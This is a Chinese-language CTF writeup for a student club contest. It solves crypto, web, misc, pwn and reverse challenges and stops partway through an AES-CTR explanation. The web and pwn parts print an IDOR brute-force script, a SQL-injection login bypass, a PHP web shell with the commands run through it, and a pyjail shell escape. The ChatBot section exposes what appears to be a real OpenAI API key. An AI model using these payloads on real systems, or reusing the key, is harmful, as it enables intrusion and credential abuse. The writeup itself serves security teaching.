---
title: NHISC CTF writeup
published: 2025-06-11
category: CTF
licenseName: "Unlicensed"
author: xzhiyouu
sourceLink: "https://hackmd.io/@xzhiyouu/NHISCCTF_2_writeup"
draft: false
---
# NHISCCTF - writeup
~~這是一份為資研社期末競賽亂出的題目解析~~<br>
CTF平台: http://23.146.248.199/
## Warm-up
#### Welcome [50]
複製貼上就好。
`NHISCCTF{7h4nk_y0u_f0r_y0uʀ_p4r71c1p47i0n_7h15_53m3573r}`
#### Access Required [100]
提示說可以從原始碼找到flag
Ctrl+F 搜尋關鍵字 `NHISCCTF` <br>
`NHISCCTF{c0ngr4tul4t10ns_y0u_f0und_th3_r34l_fl4g!}`
#### Decoding [100] 
解密流程: base64 -> binary -> caesar<br>
`NHISCCTF{10ts_of_3nc0d1ng_me7hodssssss}`
#### Copy the flag [100] 
這題參考 2025 MyFirstCTF 的 Welcome 題<br>
因為css的關係<br>
你要複製畫面上顯示的東西後貼上才是真正的flag<br>
~~啊出這題的不知道是誰應該純粹想搞人~~<br>
`NHISCCTF{This_is_correct_f1ag?}`
#### 1a2b [500]
就是一般的1a2b遊戲<br>
沒有任何資安知識的題目www<br>
`NHISCCTF{g3u55_4_4n0th3r_c0d3}`
## Crypto Basic
這邊沒有寫到的題目基本上可以找到線上解碼器喔
#### xor [100] 
```python=
from Crypto.Random import get_random_bytes
from flag import FLAG

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

random_data = get_random_bytes(len(FLAG))
result = xor_bytes(FLAG, random_data)
print(f'randomdata: {random_data.hex()}')
print(f'ciphertext: {result.hex()}')

```
```
randomdata = FLAG ^ ciphertext
```
因為xor有可逆的性質
```
FLAG = random_data ^ ciphertext
```
![image](https://hackmd.io/_uploads/B1YdYMUMxl.png)
`NHISCCTF{xor_is_sooooooooo_easy}`
#### xor_2 [100] 
```python=
from pwn import *
from flag import FLAG
from key import KEY

flag = FLAG
key = KEY
ciphertext = xor(FLAG, KEY)
print(ciphertext.hex())
```
看起來比第一題還簡單www
```
ciphertext = FLAG ^ KEY
```
所以可以推論
```
FLAG = ciphertext ^ KEY
```
![image](https://hackmd.io/_uploads/BJKCcfIfle.png)
`NHISCCTF{s1mpl3_x0r_ch4ll3ng3}`
#### xor_3 [100] 
這題難度比較高<br>
但如果懂xor的原理應該會很簡單<br>
```python=
from pwn import *
from Crypto.Random import get_random_bytes
from flag import FLAG

key_1 = get_random_bytes(16)
key_2 = get_random_bytes(16)
key_3 = get_random_bytes(16)

flag = FLAG

ciphertext_1 = xor(FLAG, key_1)
ciphertext_12 = xor(FLAG, key_2, key_1)
ciphertext_23 = xor(FLAG, key_3, key_2)
ciphertext_123 = xor(FLAG, key_1, key_2, key_3)

print("ciphertext_1:", ciphertext_1.hex())
print("ciphertext_12:", ciphertext_12.hex())
print("ciphertext_23:", ciphertext_23.hex())
print("ciphertext_123:", ciphertext_123.hex())
```
解題思路：求出`key_1`再拿去跟`ciphertext_1`做xor即可得`FLAG`
```
ciphertext_123 ^ ciphertext_23 = key_1
```
xor有一個特性是自己和自己做xor時，會自我抵銷<br>
那為什麼`ciphertext_123 ^ ciphertext_23 = key_1`?<br>
把整個式子拆開來看<br>
`ciphertext_123 ^ ciphertext_23 = (FLAG ^ key_1 ^ key_2 ^ key_3) ^ (FLAG ^ key_3 ^ key_2)`<br>
因為`FLAG`、`key_2`、`key_3`自我抵銷<br>
所以得出`ciphertext_123 ^ ciphertext_23 = key_1`<br>
拿到`key_1`，就可以與`ciphertext_1`做xor得`FLAG`<br>
```
FLAG = ciphertext_1 ^ key_1
```
![image](https://hackmd.io/_uploads/SkScazUzxx.png)
`NHISCCTF{x0r_c1ph3r_1s_4_p13c3_0f_c4k3}`
#### RSA基礎_0 [50]
給了三個數要求密文 `c`
```python=
n = 2534669
e = 65537
m = 2024 
```
根據RSA加密公式
$c = m^e\ mod\ n$
```python=
>>> n = 2534669
>>> e = 65537
>>> m = 2024
>>> c = pow(m,e,n)
>>> print(c)
1045189
```
`NHISCCTF{1045189}`
#### RSA基礎_1 [50]
這題給三個數求密鑰 `d`
```python=
p = 1237
q = 2049
e = 65537
```
```python=
>>> from Crypto.Util.number import *
>>> p = 1237
>>> q = 2049
>>> e = 65537
>>> phi_n = (p-1)*(q-1)
>>> d = inverse(e, phi_n)
>>> print(d)
434177
```
`NHISCCTF{434177}`
#### RSA基礎_2 [100]
這題給了加密過的密文，要求明文 `m`
```python=
p = 16685122511
q = 9075414707
e = 65537
c = 1844702433085970988
```
根據RSA解密公式
$m = c^d\ mod\ n$
```python=
>>> from Crypto.Util.number import *
>>> p = 16685122511
>>> q = 9075414707
>>> e = 65537
>>> c = 1844702433085970988
>>> phi_n = (p-1)*(q-1)
>>> d = inverse(e, phi_n)
>>> n = p*q
>>> m = pow(c,d,n)
>>> print(m)
10348481009510611198
```
將`10348481009510611198`轉為ASCII
![image](https://hackmd.io/_uploads/r1YK047Qee.png)
`NHISCCTF{g00d_job}`
#### Simple RSA [500] 
簡單的RSA加密
```python=
from Crypto.Util.number import *
from flag import FLAG

m = bytes_to_long(FLAG)

p = getPrime(1024)
q = getPrime(1024)
n = p*q
e = 65537

c = pow(m,e,n)

k1 = p*(q-1)
k2 = q*(p-1)

print("c=",c)
print("n=",n)
print("k1=",k1)
print("k2=",k2)
```
由RSA加密的邏輯可以知道

$φ(n) = (p-1) * (q-1)$

要解密必須找到私鑰 $d$

$d × e ≡ 1 (mod ϕ(n))$

所以可得出

$d = pow(e, -1, ϕ(n))$

因為

$k1 = p*(q-1)$
$k2 = q*(p-1)$

所以

$k1*k2=p*(q-1)*q*(p-1)=(p*q)*((p-1)*(q-1))=n*ϕ(n)$

所以 

$ϕ(n)=k1*k2//n$

```python=
from Crypto.Util.number import *

c= 14716690597104172572808743380730522771324915380762483448891636847940177036857578686732704003726513338956736387247461398897676251264176948854513401008610229101456516670937823559645911984623104399813465196377196775920521386154996732725603901685456729271564659805266821833139966388972505039145919529305011917755792994719971003718168421895731712488317712003705661130695005261123406453486354420811198393820368817521320355828828589736936104773654236403717082426215894869050285633378674824676324328473347392384934720892069937405171766668219641901470092219675586333239917978081564506136029544236305841596697927091780344347392
n= 19850166736487029756293198991077282047125288378289942741312525451604758719122726743258228351824998326038775860309496987125101529367846982802430696692657733582483297568452528721015935726017471791184499033505671827521293733875373910643405723934721634680114830698177053997996717814777502585320946531727060883649139651875663128712980605696526685626549864929294958151552764912622833913732810075124448437207327579513527849744519713113430309955491242822301860157130512125261259877518334099927712510234943573112690343400042197006594844146835713197619154113288855399367723078701603331488343879902787958302530080682146118365027
k1= 19850166736487029756293198991077282047125288378289942741312525451604758719122726743258228351824998326038775860309496987125101529367846982802430696692657733582483297568452528721015935726017471791184499033505671827521293733875373910643405723934721634680114830698177053997996717814777502585320946531727060883648999198798516113895143891702181238716043034544944413806154416241281429075553946244617085826043900226919741096971078791884176430665426279558558822996575891454564454047564752143368756623199734613549264478642797775513835502775306281761902284961883499975471097727256662330865078928054602215185640144247352368213948
k2= 19850166736487029756293198991077282047125288378289942741312525451604758719122726743258228351824998326038775860309496987125101529367846982802430696692657733582483297568452528721015935726017471791184499033505671827521293733875373910643405723934721634680114830698177053997996717814777502585320946531727060883648998322350246540685348969903925561820508820497901918512102990935272745736837231141952142149017162437854445127258645935232666300373419585973336018952210903098746964695129643554774672524277567132820791231793384706844295280319285891804705951676158673183926038968556712059444470267687719705328769847993343746246014
e = 65537

phi_n = (k1 * k2) // n
d = inverse(e, phi_n)
m = pow(c, d, n)
flag = long_to_bytes(m)
print(flag)
```
`NHISCCTF{w0w_y0u_R_$ooooooooooooo_g000000000000000000000d_4t_d3cryp71ng_R$4_c1ph3r}`
#### XOR explode into RSA [500]
```python=
from Crypto.Util.number import *
from flag import FLAG

xor_key = getPrime(8)

flag_xor = []
for i in range(len(FLAG)):
    flag_xor.append(FLAG[i] ^ xor_key)

m = bytes_to_long(bytes(flag_xor))

p = getPrime(1024)
q = getPrime(1024)
n = p*q
e = 65537

c = pow(m,e,n)

k1 = p*(q-1)
k2 = q*(p-1)

print("c=",c)
print("n=",n)
print("k1=",k1)
print("k2=",k2)
```
從上一題改的
多加了把flag的每一個bytes做xor一次<br>
並且`xor_key = getPrime(8)`<br>
所以會生成一個 8 位元的質數<br>
```python=
from Crypto.Util.number import *
from sympy import isprime

c= 1264687092236994135764491237229739085972202117500595893968941513985918853590575636999777394047361627207214420900059883781859195584664655315552860426863329506545405137662232307357703700819492967960653100052380118221992659633616828524392593738053012203002081646503725398722861444241605647648743405365040349517827503301187906112265299504348586754310890990707605228886861153572656924415840898964398496410185157356103203856049330311376486684430554729552369127309447012105469708613395565239696533375616052518965161864787956863544324428363399323777203543264542627029666141715952926417157402612483249392460557114743374522091
n= 27403636328834261546575411363389068707800461558365546177384920653825933365766788971823874586591337590873975809279400659514000252164074156057218641983873117714764317438240553652668179064715691041749352210404074116877873076763328535416972104875754886876710943457518276345231673116328365698344068999294199238663761325103940479454596000142499540208590270630055728574078250326743438119651462608181824168070803838068934105926932893933454002379384868663195778584123745195133833794948697724089490572951805637440244233162238235561719384298701718866812665302472956413681484872431657596400160807766369347828008069949756890329377    
k1= 27403636328834261546575411363389068707800461558365546177384920653825933365766788971823874586591337590873975809279400659514000252164074156057218641983873117714764317438240553652668179064715691041749352210404074116877873076763328535416972104875754886876710943457518276345231673116328365698344068999294199238663604524706641897318267302123686425736549748867487873881324045803420160546941188674343741602367601898814769475538136578545692083882329177061624558132926836030447373566491759309839244050368511821912704184458659355647708626904973005013136605912833781975526176520304614099184871049354968292139428937279987461805846   
k2= 27403636328834261546575411363389068707800461558365546177384920653825933365766788971823874586591337590873975809279400659514000252164074156057218641983873117714764317438240553652668179064715691041749352210404074116877873076763328535416972104875754886876710943457518276345231673116328365698344068999294199238663586557457933487747549045551281934910655147668684325178017931966416666620145355708559660898419801926065982878306661885365049292477006903945100714269529771865026348762428666202471805229872482936020506533464972633132973007197508334865091233519750722650318059996414644069067353391692327574600291306550958411540510
e = 65537

phi_n = k1*k2//n
d = inverse(e, phi_n)
m = pow(c, d, n)
flag_xor = long_to_bytes(m)

key = 2
while key < 256:
    if isprime(key):
        flag = []
        for i in flag_xor:
            flag.append(i ^ key)
        db = bytes(flag)

        if b'NHISCCTF{' in db:
            print(db)
            break
    key += 1
```
`NHISCCTF{RS4_c1ph3r_w1th_x0r_m1x3d_1n_1t}`
#### S-box [500]
```python=
from Crypto.Util.number import *
import base64
from flag import FLAG

s_box = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
]

encrypted_flag = []
for byte in FLAG:
    encrypted_flag.append(s_box[byte])

encrypted_base64 = base64.b64encode(bytes(encrypted_flag)).decode()
print(encrypted_base64)
```
這是基礎的對稱替代加密(S-box)，應該也算AES加密的前身(?<br>
簡單解釋一下<br>
假設有一個原本 `bytes=[0,1,2,3]` 和 `s_box=[2,0,3,1]`<br>
意思是說，`0 加密後變 2`、`1 加密後變 0`......以此類推<br>
假設有個未加密的資料`[1, 0, 3, 2]`<br>
經過s_box加密後<br>
就會變成`[0, 2, 1, 3]`<br>
所以我解密時會建一個逆s_box<br>
* s_box[0] = 2 → inverse_s_box[2] = 0
* s_box[1] = 0 → inverse_s_box[0] = 1
* s_box[2] = 3 → inverse_s_box[3] = 2
* s_box[3] = 1 → inverse_s_box[1] = 3

把加密過後的資料`[0, 2, 1, 3]`拿去對比逆s_box
* 0 → inverse_s_box[0] = 1
* 2 → inverse_s_box[2] = 0
* 1 → inverse_s_box[1] = 3
* 3 → inverse_s_box[3] = 2

就可以還原出`[1, 0, 3, 2]`

解密程式：
```python=
import base64

s_box = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
]

inverse_s_box = [0] * 256
for i in range(256):
    inverse_s_box[s_box[i]] = i

encrypted_base64 = "L1I77RoaIFohj8c8UVDDz4/PqgS8z/mPz8c8UahAkhifks/Hn8+Dw+3/"
encrypted_bytes = base64.b64decode(encrypted_base64)

decrypted_flag = []
for byte in encrypted_bytes:
    decrypted_flag.append(inverse_s_box[byte])

flag = bytes(decrypted_flag).decode()
print(flag)
```
`NHISCCTF{s1mpl3_s_b0x_is_1mport4nt_1n_A3S}`
## Website
課堂講解過之題目不再說明
#### Behind the Curtain [100]
這題是典型的IDOR爆破題<br>
可以用python腳本爆破或用工具burp suite<br>
以下示範用python爆破之腳本<br>
```python=
import requests
import re

base_url = "http://23.146.248.199:5678/user?id={}"

pattern = re.compile(r'(NHISCCTF\{.*?\})')

for i in range(1, 1001):
    resp = requests.get(base_url.format(i))
    content = resp.text
    match = pattern.search(content)
    if match:
        print(f"id={i} flag: {match.group(1)}")
        break
    else:
        print(f"id={i} No flag")

```
`NHISCCTF{y0u_ju$7_ID0R_7h3_w3bs1t3!!!!!!!!}`
#### Formulated Curiosity [100]
這題考SQL injection<br>
再輸入時可以打開底下的magic box<br>
Username輸入`' or '1'='1' -- `<br>
password即可隨意打 因為 `--` 註釋調後面的判斷<br>
使得SQL會長成這樣<br>
```sql=
SELECT * FROM users WHERE username = '' or '1'='1' -- ' AND password = '1234'
```
因為'1'='1'成立，並且加上註釋，所以後面亂打都可以過<br>
`NHISCCTF{w0w_y0u_R_r34lly_g00d_a7_sq1_1nj3c71on_n0wwwwwwwwww!!}`
#### Surface Level [100]
這題flag在原始碼<br>
但是我擋掉所有可以查看原始碼的快速鍵，包括你的右鍵<br>
有兩種解法<br>
第一種：在網址前加入`view-source:`<br>
第二種：`curl 網址`<br>
`NHISCCTF{y0u_g07_r1ckr0ll3d}`
#### Echoes in Transit [100]
打網頁題第一件事一定是看原始碼<br>
```htmlembedded=
<script>
   function getFlag() {
      window.location.href = 'flag.php';
}
</script>
```
可以看到按下按鈕後會跳轉到`flag.php`<br>
但是你又會馬上被跳轉回主頁<br>
如果要看到`flag.php`的內容<br>
就要善用`curl`指令<br>
`curl http://23.146.248.199:5683/flag.php`
得到flag
`NHISCCTF{curl_1s_the_b3st_t00l_for_th1s_t4sk}`
#### Triple Trouble [500]
進去會發現一個登入畫面<br>
SQL injection 進去後 (payload: `' or '1'='1' --`) 得到第一段flag<br>
![image](https://hackmd.io/_uploads/BJ6DjmDMlg.png)
![image](https://hackmd.io/_uploads/By__smPzle.png)
觀察網址後面多了`?id=1`<br>
推測有IDOR漏洞<br>
爆破至`id=961`時發現 admin 登入畫面<br>
![image](https://hackmd.io/_uploads/SJ_Fo7DMge.png)
但因為沒有確認你是不是真的 admin 所以沒有第二段 flag 出現<br>
紀錄你的身分的地方是 cookie <br>
將 名稱為 flag 的 cookie 改為 1 (0是false、1是true的意思)<br>
![image](https://hackmd.io/_uploads/S1wQ3QPGee.png)
刷新網頁獲得第二段 flag 及第三段 flag 的提示 `Hint: The final flag is hidden in /secret`
進入 `http://23.146.248.199:5685/secret` 是空白網頁<br>
先查看網頁原始碼<br>
![image](https://hackmd.io/_uploads/HkgqnXDfxl.png)
使用 GET 請求即可獲得 flag<br>
![image](https://hackmd.io/_uploads/SJ7T37PMxx.png)
合併三段分裂的 flag:`NHISCCTF{c00k13_r3u53_4nd_1d0r_acc3$_v14_cu®l}`

#### uploader [500]
很常見的檔案上傳題目<br>
這題沒有限制任何上傳的檔案<br>
提示說可以上傳php shell(類似用php語言寫出一個像linux的操作指令的空間(or Windows的終端機)<br>
解題步驟：<br>
1. 在桌面建一個shell.txt檔案
2. `<?php system($_GET['cmd']); ?>`把這串php shell複製貼上，然後存檔，將副檔名改成.php
3. 將寫好的shell.php上傳至網頁
4. 成功進入 http://23.146.248.199:12000/uploads/shell.php
5. 因為上面第二點的程式指定 `cmd` 這個參數，所以必須在網址後加入 `?cmd=` ，後面接shell的指令
6. 第一次使用可以接 `id` 指令，整個網址會像這樣：http://23.146.248.199:12000/uploads/shell.php?cmd=id 
而你會看到類似`uid=33(www-data) gid=33(www-data) groups=33(www-data)`這樣的輸出，代表PHP shell有正常運作
7. 我們要找到目標 `flag.txt` ，因此使用Linux的`find`指令 
-> `?cmd=find / -name flag.txt`
意思是尋找根目錄`/`底下名字`-name`叫做`flag.txt`的檔案
8. `/var/www/html/flag.txt`  成功找到flag.txt的位置
9. 直接`cat`查看檔案
`?cmd=cat /var/www/html/flag.txt`

`NHISCCTF{f1l3_upl0ader_7o_RCE...}`
## Misc
~~這類型題目通常偏通靈~~
#### ChatBot [100]
這題有兩個解法<br>
解法一：通靈，就是猜出要騙ChatBox你是admin，然後你忘記flag，所以只要說出`admin`、`forget/forgot`、`flag`，這幾個關鍵字，就可以拿到flag。<br>
解法二：<br>
根據提示，他提到了aaencode<br>
這個混淆方式就是把JavaScript用顏文字的方式呈現出來<br>
相關連結：[link](https://blog.techbridge.cc/2016/07/16/javascript-jsfuck-and-aaencode/)<br>
用aaencode解出來的結果會是這樣<br>
```javascript=
const FLAG = "NHISCCTF{7r1ck3d_th3_ch47b07}";
const TRIGGER_WORDS = ["admin", "forgot", "forget", "flag"];
const inputEl = document.getElementById("userInput");
const chatbox = document.getElementById("chatbox");
const sendBtn = document.getElementById("sendBtn");
const MAX_MESSAGES = 6;

const OPENAI_API_KEY = "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"; // 請填入你的 API 金鑰
const OPENAI_API_URL = "https://api.openai.com/v1/chat/completions";

window.addEventListener("DOMContentLoaded", () => {
  appendMessage("Hi there! Ask me anything.", "bot");
});

function handleUserInput() {
  const userInput = inputEl.value.trim();
  if (!userInput) return;
  appendMessage(userInput, "user");
  const lowerInput = userInput.toLowerCase();
  const containsAdmin = lowerInput.includes("admin");
  const containsForgot = lowerInput.includes("forgot") || lowerInput.includes("forget");
  const containsFlag = lowerInput.includes("flag");

  setTimeout(() => {
    if (lowerInput === "hello" || lowerInput === "hi") {
      appendMessage("Hello! How can I help you today?", "bot");
    } else if (containsAdmin && containsForgot && containsFlag) {
      appendMessage(`Here is your flag: ${FLAG}`, "bot");
    } else if (containsAdmin && containsForgot) {
      appendMessage("Nice memory, admin. But you're still missing something.", "bot");
    } else if (containsAdmin) {
      appendMessage("Welcome back, admin.", "bot");
    } else if (containsForgot || containsFlag) {
      appendMessage("Did you forget something? You look lost.", "bot");
    } else {
      getAIResponse(userInput);
    }
  }, 500);
  inputEl.value = "";
}

function appendMessage(text, sender) {
  const messageDiv = document.createElement("div");
  messageDiv.className = `message ${sender}`;
  messageDiv.textContent = text;
  chatbox.appendChild(messageDiv);
  const messages = chatbox.querySelectorAll(".message");
  if (messages.length > MAX_MESSAGES) {
    chatbox.removeChild(messages[0]);
  }
  chatbox.scrollTo({ top: chatbox.scrollHeight, behavior: "smooth" });
}

async function getAIResponse(userInput) {
  try {
    const response = await fetch(OPENAI_API_URL, {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${OPENAI_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        model: "gpt-3.5-turbo",
        messages: [
          { role: "system", content: "You are a sarcastic chatbot assistant." },
          { role: "user", content: userInput }
        ],
        temperature: 0.8
      })
    });

    const data = await response.json();
    const reply = data.choices[0].message.content.trim();
    appendMessage(reply, "bot");
  } catch (err) {
    appendMessage("Sorry, I can't respond right now.", "bot");
  }
}

sendBtn.addEventListener("click", handleUserInput);
inputEl.addEventListener("keydown", function (e) {
  if (e.key === "Enter") {
    handleUserInput();
  }
});

```
`NHISCCTF{7r1ck3d_th3_ch47b07}`
#### Base64.png [100]
載下來會是一個 .txt 文字檔<br>
根據題目判斷可能原本是 .png 圖片檔被拿去做 base64 編碼了<br>
到 https://www.base64decode.org/ <br>
把 .txt 丟上去<br>
會得到一張圖片<br>
![decoded-20250530103935](https://hackmd.io/_uploads/SyMfjZwMlx.png)
180度反轉後就可以看到flag了<br>
`NHISCCTF{b4se64_d3code_f1le}`
#### Morse Code [100]
https://morsecode.world/international/decoder/audio-decoder-adaptive.html<br>
檔案丟到上面這個網址讓它跑一下就有答案了<br>
`NHISCCTF{Y0URE411YK0NWWH471SM0RS3C0DE!!!}`
#### Slide Secrets [100]
flag在簡報第二頁
點開裁剪就可以看到flag了
![image](https://hackmd.io/_uploads/HkL0obwMlx.png)
#### Tiny Clue [100]
Ctrl+A全選之後可以看到有個奇怪的東西在底下
![image](https://hackmd.io/_uploads/SJ0WpZwGee.png)
`NHISCCTF{why_y0u_c4n_f1nd_m3?}`
#### Malbolge [100]
根據題目名稱與描述<br>
可以發現 Malbolge 其實一種程式語言<br>
這個程式語言的名字是來自於但丁的《神曲》中的第八層地獄 Malebolge<br>
我們可以找到線上的 Malbolge 編輯器<br>
https://zb3.me/malbolge-tools/<br>
把題目給的那串丟進去執行就會顯示flag了<br>
`NHISCCTF{c7@0t1c?}`
#### Hidden Deep [500]
隱寫術
1. 將 .zip 檔解壓縮獲得`flag.zip`、`password.txt`
2. `password.txt`的內容是 base64 編碼過的，解碼後得到`password: strongpasswd`
3. 用此密碼解壓`flag.zip`，獲得`flag.jpg`、`flag.txt`，但此`flag.txt`為假 flag，因此真正的 flag 一定藏在`flag.jpg`中
4. 使用`binwalk`發現`flag.jpg`中還有一張 .png 圖片![image](https://hackmd.io/_uploads/rysxkEvzgg.png)
5. 使用`dd`將藏在裡面的圖片分離出來![image](https://hackmd.io/_uploads/BJ2I14wzeg.png)
6. 打開分離出來的`output.png`![image](https://hackmd.io/_uploads/H1G5kNPGxe.png)
7. 使用線上工具 https://georgeom.net/StegOnline/upload 獲得 flag
8. 將 bit plane 移到 Green 0 即可看到 flag![image](https://hackmd.io/_uploads/H1nkxVDzex.png)
`NHISCCTF{7h3_v3ry_h4rd_chal1eng3_w1th_v3ry_10ng_f14g_1n_1m4g3}`
## Pwn
#### Easy Overflow [100]
Buffer Overflow 介紹: https://ithelp.ithome.com.tw/m/articles/10357887<br>
這題是簡單的 overflow ，不需要進行任何覆蓋記憶體的動作<br>
![image](https://hackmd.io/_uploads/BJyZbNPfge.png)<br>
輸入任何字元都可以，只要超過一定長度就會獲得 flag<br>
`NHISCCTF{party_overflow_with_just_AAAAAAAAAAAAAAAAAAAAAAAAAAAAA}`
#### Pyjail_0 [500]
題目給的 python 檔:
```python=
def main():
    print("Welcome to the Jail. Escape if you can.")
    user_input = input(">>> ")
    try:
        eval(user_input)
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    main()
```
在程式中可以發現`eval()`，代表它會執行任何使用者輸入的指令<br>
我們最終的目的是取得遠端的 shell (類似Windows的終端機)<br>
取得 shell 後就可以竊取任何在遠端主機上的資料<br>
因為沒有限制任何使用者輸入的東西<br>
所以使用`__import__("os").system("sh")`即可取得遠端 shell<br>
![image](https://hackmd.io/_uploads/SJbDM4DGeg.png)
可以發現 `ls` 後，我們在遠端主機的跟目錄，且裡面有`flag.txt`，還有我出這題的 python 檔案<br>
`cat flag.txt`後即可獲得 flag<br>
`NHISCCTF{Use_M2g1c_f2un3ti0n_in_P9Ja1l!!!}`
## Reverse
#### 1+1=2 [500]
1. 使用 pyinstxtractor 將 .exe 檔轉為 .pyc 檔![image](https://hackmd.io/_uploads/rkTs4EPGge.png)
2. 將解壓獲得的 main.pyc 拿去變回 .py 檔案
使用 https://pylingual.io/ 即可![image](https://hackmd.io/_uploads/BJC1B4Dzex.png)
3. 獲得原始 .py 程式碼![image](https://hackmd.io/_uploads/BJZIBNwGge.png)
`NHISCCTF{4_7ru3_r3v3rs3_4r3_4w3s0m3}`

## INSANE
#### AES-CTR [1000]
題目只有10行非常簡短好閱讀：
```python=
from Crypto.Cipher import AES
from hashlib import sha256
from base64 import b64encode
from flag import FLAG
from key import KEY

key = sha256(KEY).digest()[:16]
cipher = AES.new(key, AES.MODE_CTR, nonce=b'\x00'*8)
ct = cipher.encrypt(FLAG)
print(b64encode(ct).decode())
```
一行一行解釋一下在做甚麼
```python=
key = sha256(KEY).digest()[:16]
```
- 將 KEY 做 SHA-256 雜湊，取前 16 位元組作為 AES 的密鑰。
```python=
cipher = AES.new(key, AES.MODE_CTR, nonce=b'\x00'*8)
```
- 建立 AES 加密器，使用 CTR（Counter）模式。
- `key`：16 bytes 密鑰。
- `AES.MODE_CTR`：指定加密模式為 CTR。
- `nonce=b'\x00'*8`：8 bytes 的全 0 nonce，用於產生計數器初值。

